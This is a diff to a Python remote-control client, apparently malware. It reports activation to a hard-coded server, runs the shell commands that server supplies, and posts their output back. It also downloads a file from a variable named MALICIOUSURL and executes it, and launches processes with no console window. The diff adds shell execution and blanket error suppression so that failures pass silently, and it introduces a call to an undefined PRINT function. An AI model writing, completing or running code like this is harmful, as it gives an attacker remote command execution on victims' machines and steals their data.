@@ -4,7 +4,7 @@ import sys, string, os
 import subprocess
 import datetime
 
-SERVERADDRESS = 'http://10.0.0.6'
+SERVERADDRESS = 'http://192.168.3.63'
 CONFIGURATIONPATH = '/Configuration'
 HEADERS = {'UUID':'5a968c26-b565-4b65-8445-9e87780cb8f9-01'}
 COMMANDSTOEXE = None
@@ -36,15 +36,16 @@ def conf():
     COMMANDSTOEXE = conf['Commands']
     MALICIOUSURL = SERVERADDRESS+conf['MaliciousPath']
 
-#def RunCommand(command):
+def RunCommand(command):
 #    run = os.popen(command)
 #    results = run.read()
 #    run.close()
 #    return results
 
-    #run = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE)
-    #cmd_out, cmd_err = run.communicate()
-    #return (cmd_out.decode("utf-8"))
+    run = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE)
+    cmd_out, cmd_err = run.communicate()
+    print(cmd_out.decode("utf-8"))
+    return (cmd_out.decode("utf-8"))
 
 def subprocess_args(include_stdout=True):
     # The following is true only on Windows.
@@ -76,6 +77,7 @@ def launchWithoutConsole(command, args):
 
    run = subprocess.Popen([command] + args, startupinfo=startupinfo,stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    cmd_out, cmd_err = run.communicate()
+   PRINT(cmd_out.decode("utf-8"))
    return (cmd_out.decode("utf-8"))
 
 def PreperToSend(type,str):
@@ -83,32 +85,49 @@ def PreperToSend(type,str):
     return j
 
 def Activate():
-    HttpPostRequest('/Commands',PreperToSend("Activated",str(datetime.datetime.now())+'\r\n'))
+    try:
+        HttpPostRequest('/Commands',PreperToSend("Activated",str(datetime.datetime.now())+'\r\n'))
+    except:
+        None
     if COMMANDSTOEXE is not None:
         for command in COMMANDSTOEXE:
-            HttpPostRequest('/Commands',PreperToSend(str(command),subprocess.check_output([str(command)],**subprocess_args(False)).decode("utf-8")))
+            try:
+                HttpPostRequest('/Commands',PreperToSend(command.split()[0],subprocess.check_output(command,**subprocess_args(False),shell=True).decode("utf-8")))
+            except:
+                None
+
+
 
 
 def DownloadFile(url):
     #file = url.split('/')[-1]+'.exe'
     #r = requests.Session()
     # NOTE the stream=True parameter
-    r = requests.get(url, stream=True, headers=HEADERS)
-    file = r.headers['Filename']
-    with open(file, 'wb') as f:
-        for chunk in r.iter_content(chunk_size=1024):
-            if chunk: # filter out keep-alive new chunks
-                f.write(chunk)
-                #f.flush() commented by recommendation from J.F.Sebastian
-    return file
+    try:
+        r = requests.get(url, stream=True, headers=HEADERS)
+        file = r.headers['Filename']
+        with open(file, 'wb') as f:
+            for chunk in r.iter_content(chunk_size=1024):
+                if chunk: # filter out keep-alive new chunks
+                    f.write(chunk)
+                        #f.flush() commented by recommendation from J.F.Sebastian
+        return file
+    except:
+        None
+    return None
 
 def RemoveFile(local_filename):
-    os.remove(local_filename)
+    try:
+        os.remove(local_filename)
+    except:
+        None
 
 def RunExeFile(file):
-    os.system(file)
-
-
+    if (file is not None):
+        try:
+            os.system(file)
+        except:
+            None
 
 conf()
 Activate()
